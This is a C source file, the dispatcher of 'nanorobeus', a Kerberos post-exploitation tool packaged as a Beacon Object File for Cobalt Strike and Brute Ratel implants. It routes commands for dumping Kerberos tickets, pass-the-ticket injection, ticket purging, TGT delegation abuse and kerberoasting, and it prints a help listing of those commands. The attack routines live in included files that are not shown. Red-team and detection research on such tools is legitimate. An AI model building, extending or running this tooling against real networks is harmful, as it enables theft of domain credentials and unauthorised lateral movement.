#include <windows.h>
#include <stdio.h>
#include "beacon.h"
#include "bofdefs.h"

#if defined(BOF) || defined(BRC4)
#include "common.c"
#include "luid.c"
#include "sessions.c"
#include "purge.c"
#include "klist.c"
#include "base64.c"
#include "ptt.c"
#include "krb5.c"
#include "tgtdeleg.c"
#include "kerberoast.c"
#else
#include "common.h"
#include "luid.h"
#include "sessions.h"
#include "purge.h"
#include "klist.h"
#include "base64.h"
#include "ptt.h"
#include "krb5.h"
#include "tgtdeleg.h"
#include "kerberoast.h"
#endif

void execute(WCHAR** dispatch, char* command, char* arg1, char* arg2, char* arg3, char* arg4);

#ifdef BOF

void go(char* args, int length) {
    datap parser;
    BeaconDataParse(&parser, args, length);
    char* command = BeaconDataExtract(&parser, NULL);
    if (command == NULL) {
        command = "";
    }
    char* arg1 = BeaconDataExtract(&parser, NULL);
    if (arg1 == NULL) {
        arg1 = "";
    }
    char* arg2 = BeaconDataExtract(&parser, NULL);
    if (arg2 == NULL) {
        arg2 = "";
    }
    char* arg3 = BeaconDataExtract(&parser, NULL);
    if (arg3 == NULL) {
        arg3 = "";
    }
    char* arg4 = BeaconDataExtract(&parser, NULL);
    if (arg4 == NULL) {
        arg4 = "";
    }
    execute(NULL, command, arg1, arg2, arg3, arg4);
}

#elif BRC4

void coffee(char** argv, int argc, WCHAR** dispatch) {
    char *command = "", *arg1 = "", *arg2 = "", *arg3 = "", *arg4 = "";
    if (argc >= 1) {
        command = argv[0];
    }
    if (argc >= 2) {
        arg1 = argv[1];
    }
    if (argc >= 3) {
        arg2 = argv[2];
    }
    if (argc >= 4) {
        arg3 = argv[3];
    }
    if (argc >= 5) {
        arg4 = argv[4];
    }
    execute(dispatch, command, arg1, arg2, arg3, arg4);
}

#else

int main(int argc, char* argv[]) {
    char *command = "", *arg1 = "", *arg2 = "", *arg3 = "", *arg4 = "";
    if (argc >= 2) {
        command = argv[1];
    }
    if (argc >= 3) {
        arg1 = argv[2];
    }
    if (argc >= 4) {
        arg2 = argv[3];
    }
    if (argc >= 5) {
        arg3 = argv[4];
    }
    if (argc >= 6) {
        arg4 = argv[5];
    }
    execute(NULL, command, arg1, arg2, arg3, arg4);
    return 0;
}

#endif

void execute(WCHAR** dispatch, char* command, char* arg1, char* arg2, char* arg3, char* arg4) {
    if (MSVCRT$strcmp(command, "") == 0) {
        PRINT(dispatch, "[!] Specify command.\n");
        return;
    }

    LUID luid = (LUID){.HighPart = 0, .LowPart = 0};
    BOOL currentLuid = FALSE;
    HANDLE hToken = GetCurrentToken(TOKEN_QUERY);
    if (hToken == NULL) {
        PRINT(dispatch, "[!] Unable to query current token: %ld\n", KERNEL32$GetLastError());
        return;
    }

    if (MSVCRT$strcmp(command, "luid") == 0) {
        execute_luid(dispatch, hToken);
    } else if ((MSVCRT$strcmp(command, "sessions") == 0) || (MSVCRT$strcmp(command, "klist") == 0) ||
               (MSVCRT$strcmp(command, "dump") == 0)) {
        if (MSVCRT$strcmp(arg1, "") != 0) {
            if (MSVCRT$strcmp(arg1, "/luid") == 0) {
                if (MSVCRT$strcmp(arg2, "") != 0) {
                    luid.LowPart = MSVCRT$strtol(arg2, NULL, 16);
                    if (luid.LowPart == 0 || luid.LowPart == LONG_MAX || luid.LowPart == LONG_MIN) {
                        PRINT(dispatch, "[!] Specify valid /luid\n");
                        goto end;
                    }
                } else {
                    PRINT(dispatch, "[!] Specify /luid argument\n");
                    goto end;
                }
            } else if (MSVCRT$strcmp(arg1, "/all") == 0) {
                luid = (LUID){.HighPart = 0, .LowPart = 0};
            } else {
                PRINT(dispatch, "[!] Unknown command\n");
                goto end;
            }
        } else {
            LUID* cLuid = GetCurrentLUID(hToken);
            if (cLuid == NULL) {
                PRINT(dispatch, "[!] Unable to get current session LUID: %ld\n", KERNEL32$GetLastError());
                goto end;
            }
            luid.HighPart = cLuid->HighPart;
            luid.LowPart = cLuid->LowPart;
            currentLuid = TRUE;
            MSVCRT$free(cLuid);
        }

        if (MSVCRT$strcmp(command, "sessions") == 0) {
            execute_sessions(dispatch, hToken, luid, currentLuid);
        } else if (MSVCRT$strcmp(command, "klist") == 0) {
            execute_klist(dispatch, hToken, luid, currentLuid, FALSE);
        } else {
            execute_klist(dispatch, hToken, luid, currentLuid, TRUE);
        }
    } else if (MSVCRT$strcmp(command, "ptt") == 0) {
        char* ticket;
        if (MSVCRT$strcmp(arg1, "") != 0) {
            ticket = arg1;
            if (MSVCRT$strcmp(arg2, "") != 0) {
                if (MSVCRT$strcmp(arg2, "/luid") == 0) {
                    if (MSVCRT$strcmp(arg3, "") != 0) {
                        luid.LowPart = MSVCRT$strtol(arg3, NULL, 16);
                        if (luid.LowPart == 0 || luid.LowPart == LONG_MAX || luid.LowPart == LONG_MIN) {
                            PRINT(dispatch, "[!] Specify valid /luid\n");
                            goto end;
                        }
                    }
                }
            } else {
                LUID* cLuid = GetCurrentLUID(hToken);
                if (cLuid == NULL) {
                    PRINT(dispatch, "[!] Unable to get current session LUID: %ld\n", KERNEL32$GetLastError());
                    goto end;
                }
                luid.HighPart = cLuid->HighPart;
                luid.LowPart = cLuid->LowPart;
                currentLuid = TRUE;
                MSVCRT$free(cLuid);
            }
            execute_ptt(dispatch, hToken, ticket, luid, currentLuid);
        } else {
            PRINT(dispatch, "[!] Specify Base64 encoded ticket\n");
            goto end;
        }
    } else if (MSVCRT$strcmp(command, "purge") == 0) {
        if (MSVCRT$strcmp(arg1, "") != 0) {
            if (MSVCRT$strcmp(arg1, "/luid") == 0) {
                if (MSVCRT$strcmp(arg2, "") != 0) {
                    luid.LowPart = MSVCRT$strtol(arg2, NULL, 16);
                    if (luid.LowPart == 0 || luid.LowPart == LONG_MAX || luid.LowPart == LONG_MIN) {
                        PRINT(dispatch, "[!] Specify valid /luid\n");
                        goto end;
                    }
                } else {
                    PRINT(dispatch, "[!] Specify /luid argument\n");
                    goto end;
                }
            } else {
                PRINT(dispatch, "[!] Unknown command\n");
                goto end;
            }
        } else {
            LUID* cLuid = GetCurrentLUID(hToken);
            if (cLuid == NULL) {
                PRINT(dispatch, "[!] Unable to get current session LUID: %ld\n", KERNEL32$GetLastError());
                goto end;
            }
            luid.HighPart = cLuid->HighPart;
            luid.LowPart = cLuid->LowPart;
            currentLuid = TRUE;
            MSVCRT$free(cLuid);
        }
        execute_purge(dispatch, hToken, luid, currentLuid);
    } else if (MSVCRT$strcmp(command, "tgtdeleg") == 0) {
        char* spn = NULL;
        if (MSVCRT$strcmp(arg1, "") != 0) {
            spn = arg1;
        } else {
            PRINT(dispatch, "[!] Specify SPN\n");
            goto end;
        }
        execute_tgtdeleg(dispatch, hToken, spn);
    } else if (MSVCRT$strcmp(command, "kerberoast") == 0) {
        char* spn = NULL;
        if (MSVCRT$strcmp(arg1, "") != 0) {
            spn = arg1;
        } else {
            PRINT(dispatch, "[!] Specify SPN\n");
            goto end;
        }
        execute_kerberoast(dispatch, spn);
    } else if (MSVCRT$strcmp(command, "help") == 0) {
        PRINT(dispatch, "[*] nanorobeus 0.0.3\n[*] Command list:\n");
        PRINT(dispatch, "\tluid\n");
        PRINT(dispatch, "\tsessions [/luid <0x0> | /all]\n");
        PRINT(dispatch, "\tklist    [/luid <0x0> | /all]\n");
        PRINT(dispatch, "\tdump     [/luid <0x0> | /all]\n");
        PRINT(dispatch, "\tptt      <BASE64> [/luid <0x0>]\n");
        PRINT(dispatch, "\tpurge    [/luid <0x0>]\n");
        PRINT(dispatch, "\ttgtdeleg <SPN>\n");
        PRINT(dispatch, "\tkerberoast <SPN>\n");
    } else {
        PRINT(dispatch, "[!] Unknown command.\n");
    }
end:
    KERNEL32$CloseHandle(hToken);
}
